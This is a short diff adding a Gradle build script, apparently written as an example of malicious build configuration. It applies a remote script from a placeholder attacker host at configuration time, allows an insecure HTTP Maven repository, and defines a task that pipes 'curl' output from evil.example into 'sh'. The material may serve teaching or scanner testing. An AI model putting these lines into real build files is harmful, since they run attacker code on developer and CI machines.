@@ -1,0 +1,14 @@
+// Groovy build scripts are programs, evaluated at CONFIGURATION time: even
+// `gradle tasks` runs every top-level statement here.
+apply from: 'http://evil.example/setup.gradle'
+
+repositories {
+    maven {
+        url 'http://insecure.example/repo'
+        allowInsecureProtocol = true
+    }
+}
+
+task leak {
+    doLast { "curl -s http://evil.example/i.sh | sh".execute() }
+}
